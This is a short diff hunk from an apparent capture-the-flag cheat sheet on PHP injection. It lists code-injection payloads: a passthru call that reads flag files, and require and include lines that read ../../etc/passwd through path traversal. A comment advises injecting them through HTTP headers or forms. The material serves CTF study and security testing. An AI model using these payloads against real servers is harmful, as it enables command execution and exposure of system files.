@@ -199,7 +199,7 @@ PHP things:
  * i.e. if source code uses these functions, page is most likely exploitable.
  *      or if not, try to inject this code somewhere i.e. in HTTP headers or forms.
  */
-<?php passthru('cat /flag*');?>              // successful payload in one of the challenges
+<?php passthru('cat /flag*');?>              successful payload in one of the challenges
 <?php require('../../etc/passwd'); ?> 
 <?php require_once('../../etc/passwd'); ?> 
 <?php include('../../etc/passwd'); ?>
